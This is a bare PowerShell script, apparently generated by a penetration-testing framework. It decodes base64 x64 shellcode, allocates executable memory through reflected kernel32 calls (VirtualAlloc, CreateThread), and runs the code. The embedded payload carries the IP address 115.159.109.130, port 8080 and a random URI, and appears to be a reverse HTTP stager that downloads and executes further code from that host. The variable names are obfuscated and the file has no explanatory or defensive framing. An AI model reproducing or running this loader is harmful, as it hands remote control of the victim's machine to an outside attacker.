function xNfG6G0i {
	Param ($s8afsOQ3BJ, $sZl)		
	$cF3oD = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
	
	return $cF3oD.GetMethod('GetProcAddress').Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($cF3oD.GetMethod('GetModuleHandle')).Invoke($null, @($s8afsOQ3BJ)))), $sZl))
}

function zifuacc {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $roIWEw4,
		[Parameter(Position = 1)] [Type] $bfIMsi3v = [Void]
	)
	
	$cUGQtU9n6 = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$cUGQtU9n6.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $roIWEw4).SetImplementationFlags('Runtime, Managed')
	$cUGQtU9n6.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $bfIMsi3v, $roIWEw4).SetImplementationFlags('Runtime, Managed')
	
	return $cUGQtU9n6.CreateType()
}

[Byte[]]$vgI5 = [System.Convert]::FromBase64String("/EiD5PDozAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdBmgXgYCwIPhXIAAACLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpS////11IMdtTSb53aW5pbmV0AEFWSInhScfCTHcmB//VU1NIieFTWk0xwE0xyVNTSbo6VnmnAAAAAP/V6BAAAAAxMTUuMTU5LjEwOS4xMzAAWkiJwUnHwJAfAABNMclTU2oDU0m6V4mfxgAAAAD/1egwAAAAL1FYUWsyZEdtODJ5cmthcVQ4ZzFCRFFNeGdGeWtfcGpEeUE0NUpxOEZOdGE3NGMASInBU1pBWE0xyVNIuAACIIQAAAAAUFNTScfC61UuO//VSInGagpfSInxU1pNMcBNMclTU0nHwi0GGHv/1YXAdR9Ix8GIEwAASbpE8DXgAAAAAP/VSP/PdALrzOhWAAAAU1lqQFpJidHB4hBJx8AAEAAASbpYpFPlAAAAAP/VSJNTU0iJ50iJ8UiJ2knHwAAgAABJiflJuhKWieIAAAAA/9VIg8QghcB0smaLB0gBw4XAddJYWMNYagBZScfC8LWiVv/V")
		
$idmyWkXO = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xNfG6G0i kernel32.dll VirtualAlloc), (zifuacc @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $vgI5.Length,0x3000, 0x40)
[System.Runtime.InteropServices.Marshal]::Copy($vgI5, 0, $idmyWkXO, $vgI5.length)

$wsOK9Yt = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xNfG6G0i kernel32.dll CreateThread), (zifuacc @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$idmyWkXO,[IntPtr]::Zero,0,[IntPtr]::Zero)
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((xNfG6G0i kernel32.dll WaitForSingleObject), (zifuacc @([IntPtr], [Int32]))).Invoke($wsOK9Yt,0xffffffff) | Out-Null
